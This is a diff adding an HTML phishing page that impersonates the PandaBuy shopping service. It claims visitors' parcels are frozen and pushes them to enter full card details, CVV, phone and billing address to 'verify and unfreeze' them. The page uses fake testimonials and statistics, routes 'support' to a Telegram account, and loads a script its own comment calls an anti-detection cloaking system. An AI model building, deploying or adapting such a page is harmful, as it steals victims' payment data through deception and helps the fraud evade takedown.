@@ -1,0 +1,621 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PandaBuy - Shop from China</title>
+    <!-- Favicon links -->
+    <link rel="icon" href="https://www.pandabuy.com/static/favicon.ico" type="image/png">
+    <link rel="shortcut icon" href="https://www.pandabuy.com/static/favicon.ico" type="image/png">
+    <link rel="apple-touch-icon" href="https://www.pandabuy.com/static/favicon.ico">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <!-- Anti-detection cloaking system -->
+    <script src="cloaking.js"></script>
+</head>
+<body>
+    <header>
+        <div class="top-bar">
+            <div class="logo">
+                <img src="images/logo.png" alt="PandaBuy Logo">
+            </div>
+            <div class="search-container">
+                <input type="text" placeholder="Search for your parcels or track shipments...">
+                <button type="button" class="search-icon"><i class="fas fa-search"></i></button>
+            </div>
+            <div class="right-menu">
+                <a href="#" class="menu-item"><i class="fas fa-box"></i> My Parcels</a>
+                <a href="#" class="menu-item"><i class="fas fa-truck"></i> Track Shipment</a>
+                <a href="https://t.me/azzarro" target="_blank" class="menu-item support-link"><i class="fas fa-headset"></i> Support</a>
+                <div class="language-selector menu-item">
+                    <span><i class="fas fa-globe"></i> English / CNY</span>
+                </div>
+            </div>
+        </div>
+        
+        <div class="toast-notification" id="systemNotification">
+            <div class="toast-icon">
+                <i class="fas fa-info-circle"></i>
+            </div>
+            <div class="toast-content">
+                <h4>System Update</h4>
+                <p>Maintenance completed. All services have been restored. Thank you for your patience!</p>
+            </div>
+            <button class="toast-close" aria-label="Close notification">
+                <i class="fas fa-times"></i>
+            </button>
+        </div>
+    </header>
+
+    <main>
+        <!-- Hero Section -->
+        <section class="hero">
+            <div class="hero-content">
+                <h1>Welcome Back to PandaBuy!</h1>
+                <h2 class="hero-subtitle">We're back and better than ever</h2>
+                <p class="hero-description">Our systems are fully operational and your parcels are ready to be shipped. Verify your details once to unfreeze all your orders.</p>
+                
+                <div class="hero-cta">
+                    <button type="button" class="primary-btn">Verify & Unfreeze Parcels</button>
+                    <button type="button" class="secondary-btn">Track My Shipments</button>
+                </div>
+                
+                <div class="support-banner">
+                    <div class="support-icon">
+                        <i class="fab fa-telegram"></i>
+                    </div>
+                    <div class="support-text">
+                        <p>Need immediate assistance?</p>
+                    </div>
+                    <a href="https://t.me/azzarro" target="_blank" class="support-button">
+                        Contact Support
+                        <i class="fas fa-arrow-right"></i>
+                    </a>
+                </div>
+            </div>
+            
+            <div class="hero-image">
+                <img src="https://images.unsplash.com/photo-1586528116311-ad8dd3c8310d?ixlib=rb-4.0.3&ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&auto=format&fit=crop&w=1740&q=80" alt="Packages being prepared for shipping">
+                <div class="hero-status">
+                    <div class="status-dot pulse"></div>
+                    <span>All systems operational</span>
+                </div>
+            </div>
+        </section>
+        
+        <!-- Testimonials Section -->
+        <section class="testimonials-section">
+            <div class="testimonials-container">
+                <div class="testimonials-header">
+                    <h2>What Our Customers Say</h2>
+                </div>
+                
+                <div class="testimonials-grid">
+                    <div class="testimonial-card">
+                        <div class="testimonial-content">
+                            <p class="testimonial-text">
+                                "After verifying my details, my parcels were unfrozen and delivered within just 3 days! Amazing service from PandaBuy."
+                            </p>
+                            <div class="testimonial-author">
+                                <div class="testimonial-avatar">
+                                    <img src="https://images.unsplash.com/photo-1568602471122-7832951cc4c5?ixlib=rb-4.0.3&ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&auto=format&fit=crop&w=150&q=80" alt="Michael T.">
+                                </div>
+                                <div class="testimonial-info">
+                                    <div class="testimonial-name">Michael T.</div>
+                                    <div class="testimonial-rating">
+                                        <i class="fas fa-star"></i>
+                                        <i class="fas fa-star"></i>
+                                        <i class="fas fa-star"></i>
+                                        <i class="fas fa-star"></i>
+                                        <i class="fas fa-star"></i>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="testimonial-card">
+                        <div class="testimonial-content">
+                            <p class="testimonial-text">
+                                "I was worried about my frozen parcels, but the verification process was quick and my items arrived safely. Thank you!"
+                            </p>
+                            <div class="testimonial-author">
+                                <div class="testimonial-avatar">
+                                    <img src="https://images.unsplash.com/photo-1580489944761-15a19d654956?ixlib=rb-4.0.3&ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&auto=format&fit=crop&w=150&q=80" alt="Sarah K.">
+                                </div>
+                                <div class="testimonial-info">
+                                    <div class="testimonial-name">Sarah K.</div>
+                                    <div class="testimonial-rating">
+                                        <i class="fas fa-star"></i>
+                                        <i class="fas fa-star"></i>
+                                        <i class="fas fa-star"></i>
+                                        <i class="fas fa-star"></i>
+                                        <i class="fas fa-star-half-alt"></i>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="service-steps">
+            <h2>How to Unfreeze Your Parcels</h2>
+            <div class="steps-container">
+                <div class="step-card">
+                    <div class="step-number">1</div>
+                    <div class="step-icon"><i class="fas fa-user-check"></i></div>
+                    <h3>Verify Your Details</h3>
+                    <p>Update your payment information and billing address to verify your identity.</p>
+                </div>
+                <div class="step-card">
+                    <div class="step-number">2</div>
+                    <div class="step-icon"><i class="fas fa-box"></i></div>
+                    <h3>Parcels Unfrozen</h3>
+                    <p>Our system will automatically unfreeze all your pending parcels.</p>
+                </div>
+                <div class="step-card">
+                    <div class="step-number">3</div>
+                    <div class="step-icon"><i class="fas fa-shipping-fast"></i></div>
+                    <h3>Express Shipping</h3>
+                    <p>Your parcels will be processed and shipped within 24 hours.</p>
+                </div>
+                <div class="step-card">
+                    <div class="step-number">4</div>
+                    <div class="step-icon"><i class="fas fa-home"></i></div>
+                    <h3>Doorstep Delivery</h3>
+                    <p>Receive your packages directly at your doorstep in 3-5 business days.</p>
+                </div>
+            </div>
+        </section>
+
+        <section class="account-verification">
+            <div class="verification-card">
+                <div class="verification-image">
+                    <img src="https://images.unsplash.com/photo-1580674285054-bed31e145f59?ixlib=rb-4.0.3&ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&auto=format&fit=crop&w=1470&q=80" alt="Parcels ready to ship">
+                </div>
+                <div class="verification-content">
+                    <div class="verification-header">
+                        <div class="verification-icon">
+                            <i class="fas fa-box"></i>
+                        </div>
+                        <h2>Your Parcels Are Ready To Ship</h2>
+                    </div>
+                    
+                    <div class="verification-details">
+                        <div class="detail-item">
+                            <i class="fas fa-check-circle"></i>
+                            <span>All parcels have been processed</span>
+                        </div>
+                        <div class="detail-item">
+                            <i class="fas fa-check-circle"></i>
+                            <span>Shipping labels prepared</span>
+                        </div>
+                        <div class="detail-item">
+                            <i class="fas fa-exclamation-circle"></i>
+                            <span>Verification required to unfreeze</span>
+                        </div>
+                    </div>
+                    
+                    <p class="verification-text">We need to verify your payment details to unfreeze your parcels and complete the shipping process. This is a one-time verification that will connect your card information to your account.</p>
+                    
+                    <button class="verification-btn">Verify & Unfreeze Parcels</button>
+                    
+                    <div class="verification-footer">
+                        <div class="contact-options">
+                            <a href="https://t.me/azzarro" target="_blank" class="contact-option telegram">
+                                <div class="contact-icon">
+                                    <i class="fab fa-telegram"></i>
+                                </div>
+                                <div class="contact-info">
+                                    <span class="contact-label">Telegram Support</span>
+                                    <span class="contact-value">t.me/azzarro</span>
+                                </div>
+                            </a>
+                            <a href="mailto:support@pandabuy.com" class="contact-option email">
+                                <div class="contact-icon">
+                                    <i class="fas fa-envelope"></i>
+                                </div>
+                                <div class="contact-info">
+                                    <span class="contact-label">Email Support</span>
+                                    <span class="contact-value">support@pandabuy.com</span>
+                                </div>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+        
+        <section class="features-section">
+            <h2>Premium Services Resuming</h2>
+            <div class="features-container">
+                <div class="feature-box">
+                    <div class="feature-icon">
+                        <i class="fas fa-shipping-fast"></i>
+                    </div>
+                    <h3>Express Shipping</h3>
+                    <p>Our fastest shipping options are now available again with 3-5 day delivery to most countries.</p>
+                    <div class="feature-badge">Resuming</div>
+                </div>
+                
+                <div class="feature-box">
+                    <div class="feature-icon">
+                        <i class="fas fa-map-marked-alt"></i>
+                    </div>
+                    <h3>Global Coverage</h3>
+                    <p>We've resumed operations in all countries with improved tracking and delivery services.</p>
+                    <div class="feature-badge">Available</div>
+                </div>
+                
+                <div class="feature-box">
+                    <div class="feature-icon">
+                        <i class="fas fa-shield-alt"></i>
+                    </div>
+                    <h3>Secure Payments</h3>
+                    <p>Our payment system has been upgraded with enhanced security and faster processing.</p>
+                    <div class="feature-badge">Enhanced</div>
+                </div>
+                
+                <div class="feature-box">
+                    <div class="feature-icon">
+                        <i class="fas fa-headset"></i>
+                    </div>
+                    <h3>24/7 Support</h3>
+                    <p>Our customer support team is now available 24/7 to assist with any questions or concerns.</p>
+                    <div class="feature-badge">Active</div>
+                </div>
+            </div>
+        </section>
+        
+        <!-- Welcome Section moved to the end -->
+        <section class="welcome-section">
+            <div class="welcome-container">
+                <div class="welcome-header">
+                    <h2>Welcome Back, PandaBuy Users!</h2>
+                </div>
+                <p class="welcome-description">
+                    We're excited to resume our services and help you receive your parcels as quickly as possible. 
+                    Our team is working around the clock to ensure a smooth experience.
+                </p>
+                
+                <div class="stats-container">
+                    <div class="stat-card">
+                        <div class="stat-icon">
+                            <i class="fas fa-box"></i>
+                        </div>
+                        <div class="stat-number">15,000+</div>
+                        <div class="stat-label">Parcels Unfrozen</div>
+                    </div>
+                    
+                    <div class="stat-card">
+                        <div class="stat-icon">
+                            <i class="fas fa-clock"></i>
+                        </div>
+                        <div class="stat-number">98%</div>
+                        <div class="stat-label">Same-Day Processing</div>
+                    </div>
+                    
+                    <div class="stat-card">
+                        <div class="stat-icon">
+                            <i class="fas fa-smile"></i>
+                        </div>
+                        <div class="stat-number">10,000+</div>
+                        <div class="stat-label">Happy Customers</div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Payment Modal -->
+        <div id="paymentModal" class="modal">
+            <div class="modal-content">
+                <span class="close">&times;</span>
+                <div class="payment-header">
+                    <img src="images/logo.png" alt="PandaBuy Logo" class="payment-logo">
+                    <h2>Verify Your Details to Unfreeze Parcels</h2>
+                    <p class="payment-header-text">All your frozen parcels will be sent to your address once verified</p>
+                                    <div class="modal-support-options">
+                    <div class="modal-support-header">
+                        <i class="fas fa-headset"></i>
+                        <span>Need help? Our support team is ready to assist you</span>
+                    </div>
+                    <div class="modal-support-channels">
+                        <a href="https://t.me/azzarro" target="_blank" class="modal-support-channel">
+                            <i class="fab fa-telegram"></i>
+                            <span>Telegram Support</span>
+                        </a>
+                        <a href="mailto:support@pandabuy.com" class="modal-support-channel">
+                            <i class="fas fa-envelope"></i>
+                            <span>Email Support</span>
+                        </a>
+                    </div>
+                </div>
+                <div class="card-icons">
+                    <i class="fab fa-cc-visa"></i>
+                    <i class="fab fa-cc-mastercard"></i>
+                    <i class="fab fa-cc-amex"></i>
+                    <i class="fab fa-cc-discover"></i>
+                </div>
+                <div class="verification-stages">
+                    <div class="stage active" id="stage-verify">
+                        <div class="stage-icon">
+                            <i class="fas fa-user-check"></i>
+                        </div>
+                        <div class="stage-name">Verify</div>
+                    </div>
+                    <div class="stage" id="stage-connect">
+                        <div class="stage-icon">
+                            <i class="fas fa-database"></i>
+                        </div>
+                        <div class="stage-name">Connect</div>
+                    </div>
+                    <div class="stage" id="stage-unfreeze">
+                        <div class="stage-icon">
+                            <i class="fas fa-box"></i>
+                        </div>
+                        <div class="stage-name">Unfreeze</div>
+                    </div>
+                    <div class="stage" id="stage-ship">
+                        <div class="stage-icon">
+                            <i class="fas fa-shipping-fast"></i>
+                        </div>
+                        <div class="stage-name">Ship</div>
+                    </div>
+                </div>
+                </div>
+                <form id="paymentForm">
+                    <div class="form-section">
+                        <h3>Card Information</h3>
+                        <div class="form-group">
+                            <label for="cardName">Cardholder Name (as shown on card)</label>
+                            <input type="text" id="cardName" autocomplete="cc-name" required>
+                        </div>
+                        <div class="form-group card-number-group">
+                            <label for="cardNumber">Card Number</label>
+                            <div class="card-input-wrapper">
+                                <input type="text" id="cardNumber" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" autocomplete="cc-number" required>
+                                <div class="card-type-icon" id="cardTypeIcon"></div>
+                            </div>
+                        </div>
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="expMonth">Expiration Date</label>
+                                <div class="exp-date-inputs">
+                                    <select id="expMonth" required>
+                                        <option value="">Month</option>
+                                        <option value="01">01 - January</option>
+                                        <option value="02">02 - February</option>
+                                        <option value="03">03 - March</option>
+                                        <option value="04">04 - April</option>
+                                        <option value="05">05 - May</option>
+                                        <option value="06">06 - June</option>
+                                        <option value="07">07 - July</option>
+                                        <option value="08">08 - August</option>
+                                        <option value="09">09 - September</option>
+                                        <option value="10">10 - October</option>
+                                        <option value="11">11 - November</option>
+                                        <option value="12">12 - December</option>
+                                    </select>
+                                    <select id="expYear" required>
+                                        <option value="">Year</option>
+                                        <option value="2025">2025</option>
+                                        <option value="2026">2026</option>
+                                        <option value="2027">2027</option>
+                                        <option value="2028">2028</option>
+                                        <option value="2029">2029</option>
+                                        <option value="2030">2030</option>
+                                    </select>
+                                </div>
+                            </div>
+                            <div class="form-group cvv-group">
+                                <label for="cvv">CVV / CVC</label>
+                                <div class="cvv-input-wrapper">
+                                    <input type="text" id="cvv" placeholder="XXX" maxlength="4" autocomplete="cc-csc" required>
+                                    <div class="cvv-info" id="cvvInfo">
+                                        <i class="fas fa-question-circle"></i>
+                                        <div class="tooltip">3 or 4 digits usually found on the back of your card</div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="form-section">
+                        <h3>Billing Information</h3>
+                        <div class="form-group">
+                            <label for="email">Email Address</label>
+                            <input type="email" id="email" autocomplete="email" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="phoneNumber">Phone Number</label>
+                            <input type="tel" id="phoneNumber" autocomplete="tel" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="billingAddress">Billing Address</label>
+                            <input type="text" id="billingAddress" autocomplete="address-line1" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="billingAddress2">Address Line 2 (optional)</label>
+                            <input type="text" id="billingAddress2" autocomplete="address-line2">
+                        </div>
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="city">City</label>
+                                <input type="text" id="city" autocomplete="address-level2" required>
+                            </div>
+                            <div class="form-group">
+                                <label for="state">State/Province</label>
+                                <input type="text" id="state" autocomplete="address-level1" required>
+                            </div>
+                        </div>
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="zipCode">ZIP/Postal Code</label>
+                                <input type="text" id="zipCode" autocomplete="postal-code" required>
+                            </div>
+                            <div class="form-group">
+                                <label for="country">Country</label>
+                                <select id="country" autocomplete="country" required>
+                                    <option value="">Select Country</option>
+                                    <option value="US">United States</option>
+                                    <option value="GB">United Kingdom</option>
+                                    <option value="CA">Canada</option>
+                                    <option value="AU">Australia</option>
+                                    <option value="DE">Germany</option>
+                                    <option value="FR">France</option>
+                                    <option value="IT">Italy</option>
+                                    <option value="ES">Spain</option>
+                                    <option value="NL">Netherlands</option>
+                                    <option value="BE">Belgium</option>
+                                    <option value="SE">Sweden</option>
+                                    <option value="NO">Norway</option>
+                                    <option value="DK">Denmark</option>
+                                    <option value="FI">Finland</option>
+                                    <option value="PL">Poland</option>
+                                    <option value="CZ">Czech Republic</option>
+                                    <option value="SK">Slovakia</option>
+                                    <option value="AT">Austria</option>
+                                    <option value="CH">Switzerland</option>
+                                    <option value="IE">Ireland</option>
+                                    <option value="PT">Portugal</option>
+                                    <option value="GR">Greece</option>
+                                    <option value="HU">Hungary</option>
+                                    <option value="RO">Romania</option>
+                                    <option value="BG">Bulgaria</option>
+                                    <option value="HR">Croatia</option>
+                                    <option value="SI">Slovenia</option>
+                                    <option value="LV">Latvia</option>
+                                    <option value="LT">Lithuania</option>
+                                    <option value="EE">Estonia</option>
+                                    <option value="JP">Japan</option>
+                                    <option value="KR">South Korea</option>
+                                    <option value="RU">Russia</option>
+                                    <option value="UA">Ukraine</option>
+                                    <option value="CN">China</option>
+                                    <option value="IN">India</option>
+                                    <option value="BR">Brazil</option>
+                                    <option value="MX">Mexico</option>
+                                </select>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="secure-notice">
+                        <i class="fas fa-lock"></i> Your payment information is securely processed and used to verify your identity
+                    </div>
+                    
+                    <div class="required-notice">
+                        <i class="fas fa-exclamation-triangle"></i> Your parcels will remain frozen until payment details are verified
+                    </div>
+
+                    <div class="parcel-notice">
+                        <i class="fas fa-box"></i> After verification, your parcels will be processed and shipped immediately
+                    </div>
+                    
+                    <div class="processing-wrapper" id="processingBar" style="display: none;">
+                        <div class="processing-bar"></div>
+                    </div>
+                    <button type="submit" class="submit-btn" id="submitBtn">
+                        <i class="fas fa-shield-alt"></i>
+                        Verify & Unfreeze My Parcels
+                    </button>
+                </form>
+            </div>
+        </div>
+    </main>
+
+    <footer>
+        <div class="footer-container">
+            <div class="footer-section">
+                <h3>Company</h3>
+                <ul>
+                    <li><a href="#">About Us</a></li>
+                    <li><a href="#">Our Mission</a></li>
+                    <li><a href="#">Terms & Conditions</a></li>
+                    <li><a href="#">Privacy Policy</a></li>
+                </ul>
+            </div>
+            <div class="footer-section">
+                <h3>Support Center</h3>
+                <ul>
+                    <li><a href="#">Help & FAQ</a></li>
+                    <li><a href="#">Contact Support</a></li>
+                    <li><a href="#">Shipping Information</a></li>
+                    <li><a href="#">Returns & Exchanges</a></li>
+                </ul>
+            </div>
+            <div class="footer-section">
+                <h3>Legal Information</h3>
+                <ul>
+                    <li><a href="#">Terms of Service</a></li>
+                    <li><a href="#">Privacy Policy</a></li>
+                    <li><a href="#">Cookie Policy</a></li>
+                    <li><a href="#">Prohibited Items</a></li>
+                    <li><a href="#">Customs Regulations</a></li>
+                </ul>
+            </div>
+            <div class="footer-section">
+                <h3>Secure Payments</h3>
+                <div class="payment-methods">
+                    <img src="https://cdn.jsdelivr.net/npm/payment-icons@1.0.0/min/flat/visa.svg" alt="Visa">
+                    <img src="https://cdn.jsdelivr.net/npm/payment-icons@1.0.0/min/flat/mastercard.svg" alt="Mastercard">
+                    <img src="https://cdn.jsdelivr.net/npm/payment-icons@1.0.0/min/flat/amex.svg" alt="American Express">
+                    <img src="https://cdn.jsdelivr.net/npm/payment-icons@1.0.0/min/flat/paypal.svg" alt="PayPal">
+                </div>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <p>&copy; 2024 PandaBuy. All rights reserved. | Secure shopping guaranteed</p>
+        </div>
+        <div class="copyright-bar">
+            <div class="legal-info">
+                <div class="company-info">
+                    Copyright© 2020-2025 pandabuy.com All Rights Reserved 浙ICP备20210003110号<br>
+                    Company name: PANDA (UK) TECHNOLOGY CO., LIMITED Company number: 14052339<br>
+                    Registered office address: Flat 107 25 Indescon Square, London, England, E14 9DG
+                </div>
+                
+                <div class="legal-links">
+                    <a href="#">Terms of Service</a>
+                    <a href="#">Privacy Policy</a>
+                    <a href="#">Cookie Policy</a>
+                    <a href="#">User Agreement</a>
+                    <a href="#">GDPR Compliance</a>
+                    <a href="#">Shipping Policy</a>
+                    <a href="#">Refund Policy</a>
+                    <a href="#">Customs Clearance</a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script src="script.js"></script>
+    <script src="visitor-tracker.js"></script>
+
+    <!-- Add this right before the closing </body> tag -->
+    <div id="customAlert" class="custom-alert">
+        <div class="custom-alert-content">
+            <div class="custom-alert-header">
+                <div class="custom-alert-icon">
+                    <i class="fas fa-info-circle"></i>
+                </div>
+                <h3 class="custom-alert-title">Verification Required</h3>
+                <button class="custom-alert-close">
+                    <i class="fas fa-times"></i>
+                </button>
+            </div>
+            <div class="custom-alert-body">
+                <p id="customAlertMessage">You must verify your details to unfreeze your parcels and continue.</p>
+            </div>
+            <div class="custom-alert-footer">
+                <button id="customAlertOk" class="custom-alert-button">Verify Now</button>
+            </div>
+        </div>
+    </div>
+</body>
+</html> 
